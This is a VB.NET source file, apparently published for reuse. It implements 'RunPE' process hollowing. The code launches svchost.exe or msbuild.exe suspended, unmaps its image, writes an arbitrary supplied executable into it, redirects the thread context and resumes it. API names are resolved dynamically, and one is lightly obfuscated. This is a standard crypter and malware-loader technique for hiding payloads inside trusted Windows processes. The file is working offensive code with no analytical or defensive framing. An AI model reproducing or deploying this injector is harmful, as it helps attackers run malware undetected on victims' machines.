Imports System.Runtime.InteropServices
Imports System.Diagnostics
Public Class vRunPe

    ' Author: Suleiman Al-Othman
    ' Twitter: @sulealothman
    ' Class vRunPe -> RunPE
    ' for Using Class -> Dim V As New vRunPe : V.Execute(yourData,AppInject)
    ' Version: v0.1
    ' Created: 5/3/2017

    Structure func
        Delegate Function _CreateProcessW(ByVal app As String, ByVal cmd As String, ByVal PTA As IntPtr, ByVal thrAttr As IntPtr, <MarshalAs(UnmanagedType.Bool)> ByVal inherit As Boolean, ByVal creation As Integer, _
  ByVal env As IntPtr, ByVal curDir As String, ByVal sI As Byte(), ByVal pI As IntPtr()) As <MarshalAs(UnmanagedType.Bool)> Boolean
        Delegate Function _NtGetContextThread(ByVal hThr As IntPtr, ByVal Context As UInteger()) As <MarshalAs(UnmanagedType.Bool)> Boolean
        Delegate Function _NtUnmapViewOfSection(ByVal hProc As IntPtr, ByVal baseAddr As IntPtr) As UInteger
        Delegate Function _NtReadVirtualMemory(ByVal hProc As IntPtr, ByVal baseAddr As IntPtr, ByRef bufr As IntPtr, ByVal bufrSS As Integer, ByRef numRead As IntPtr) As <MarshalAs(UnmanagedType.Bool)> Boolean
        Delegate Function _NtResumeThread(ByVal hThread As IntPtr, ByVal SC As IntPtr) As UInteger
        Delegate Function _NtSetContextThread(ByVal hThr As IntPtr, ByVal Context As UInteger()) As <MarshalAs(UnmanagedType.Bool)> Boolean
        Delegate Function _VirtualAllocEx(ByVal hProc As IntPtr, ByVal addr As IntPtr, ByVal SS As IntPtr, ByVal allocType As Integer, ByVal prot As Integer) As IntPtr
        Delegate Function _NtWriteVirtualMemory(ByVal hProcess As IntPtr, ByVal VABA As IntPtr, ByVal buff As Byte(), ByVal nSS As UInteger, ByVal NOBW As Integer) As Boolean
        Public Declare Function GetProcAddress Lib "kernel32" Alias "GetProcAddress" (ByVal hModule As IntPtr, ByVal funcName As String) As UIntPtr
        Public Declare Function LoadLibraryA Lib "kernel32" Alias "LoadLibraryA" (ByVal ModuleName As String) As IntPtr
    End Structure

    Public Function Execute(ByVal Buff() As Byte, ByVal ProInject As String) As Boolean
        Try
            Dim KernelAddr As Integer = func.LoadLibraryA("kernel32")
            Dim ntAddr As Integer = func.LoadLibraryA("ntdll")
            Dim hAlloc As GCHandle = GCHandle.Alloc(Buff, GCHandleType.Pinned)
            Dim hModuleBase As Integer = hAlloc.AddrOfPinnedObject
            hAlloc.Free()
            Dim PI(&H3) As IntPtr
            Dim SI(&H43) As Byte
            Dim IB As Integer
            Dim bContext(&HB2) As UInteger
            bContext(&H0) = &H10002
            Dim addr As Integer = func.GetProcAddress(KernelAddr, "CreateProcessA")
            Dim iC As func._CreateProcessW = Marshal.GetDelegateForFunctionPointer(addr, GetType(func._CreateProcessW))
            iC(ProInject, Nothing, IntPtr.Zero, IntPtr.Zero, False, &H4, IntPtr.Zero, Nothing, SI, PI)
            Dim lRes As Integer
            addr = func.GetProcAddress(ntAddr, "NtReadVirtualMemory")
            Dim ntRv As func._NtReadVirtualMemory = Marshal.GetDelegateForFunctionPointer(addr, GetType(func._NtReadVirtualMemory))
            ntRv(Process.GetCurrentProcess.Handle, hModuleBase + &H3C, lRes, &H4, &H0)
            Dim PE As Integer = (hModuleBase + lRes)
            ntRv(Process.GetCurrentProcess.Handle, PE + &H34, lRes, &H4, &H0)
            IB = lRes
            addr = func.GetProcAddress(ntAddr, "NtUnmapViewOfSection")
            Dim ntU As func._NtUnmapViewOfSection = Marshal.GetDelegateForFunctionPointer(addr, GetType(func._NtUnmapViewOfSection))
            addr = func.GetProcAddress(KernelAddr, "VirtualAllocEx")
            Dim Vir As func._VirtualAllocEx = Marshal.GetDelegateForFunctionPointer(addr, GetType(func._VirtualAllocEx))
            ntRv(Process.GetCurrentProcess.Handle, PE + &H50, lRes, &H4, &H0)
            Dim Virtual As IntPtr = Vir(PI(&H0), IB, lRes, &H3000, &H40)
            Dim laddr As New IntPtr(BitConverter.ToInt32(Buff, BitConverter.ToInt32(Buff, &H3C) + &H34))
            Dim nAddr As New IntPtr(BitConverter.ToInt32(Buff, BitConverter.ToInt32(Buff, &H3C) + &H50))
            addr = func.GetProcAddress(ntAddr, "NtWriteVirtualMemory")
            Dim ntW As func._NtWriteVirtualMemory = Marshal.GetDelegateForFunctionPointer(addr, GetType(func._NtWriteVirtualMemory))
            ntRv(Process.GetCurrentProcess.Handle, PE + &H54, lRes, &H4, &H0)
            ntW(PI(&H0), Virtual, Buff, CUInt(CInt(lRes)), &H0)
            Dim dData(&H9) As Integer
            Dim SectionData As Byte()
            ntRv(Process.GetCurrentProcess.Handle, PE + &H6, lRes, &H2, &H0)
            For i = &H0 To lRes - &H1
                Buffer.BlockCopy(Buff, (BitConverter.ToInt32(Buff, &H3C) + &HF8) + (i * &H28), dData, &H0, &H28)
                SectionData = New Byte((dData(&H4) - &H1)) {}
                Buffer.BlockCopy(Buff, dData(&H5), SectionData, &H0, SectionData.Length)
                nAddr = New IntPtr(Virtual.ToInt32() + dData(&H3))
                laddr = New IntPtr(SectionData.Length)
                ntW(PI(&H0), nAddr, SectionData, CUInt(laddr), &H0)
            Next i
            addr = func.GetProcAddress(ntAddr, "NtGetContextThread")
            Dim ntG As func._NtGetContextThread = Marshal.GetDelegateForFunctionPointer(addr, GetType(func._NtGetContextThread))
            ntG(PI(&H1), bContext)
            ntW(PI(&H0), bContext(&H29) + &H8, BitConverter.GetBytes(Virtual.ToInt32()), CUInt(&H4), &H0)
            ntRv(Process.GetCurrentProcess.Handle, PE + &H28, lRes, &H4, &H0)
            bContext(&H2C) = IB + lRes
            addr = func.GetProcAddress(ntAddr, "NtSetContextThread")
            Dim ntS As func._NtSetContextThread = Marshal.GetDelegateForFunctionPointer(addr, GetType(func._NtSetContextThread))
            ntS(PI(&H1), bContext)
            addr = func.GetProcAddress(ntAddr, "_NtResumeThread".Replace("_", ""))
            Dim ntR As func._NtResumeThread = Marshal.GetDelegateForFunctionPointer(addr, GetType(func._NtResumeThread))
            ntR(PI(&H1), &H0)
        Catch ex As Exception
            Return False
        End Try
        Return True
    End Function
    Shared Sub main()
        '
        Dim buff() As Byte = {0, 1} ' Replace {0,1} with your bytes
        Dim pathInject As String = Environ("windir") & "\System32\svchost.exe" ' for native
        'Dim pathInject As String = Environ("windir") & "\Microsoft.NET\Framework\v2.0.50727\msbuild.exe" | for .net 
        Dim V As New vRunPe : V.Execute(buff, pathInject)
    End Sub
End Class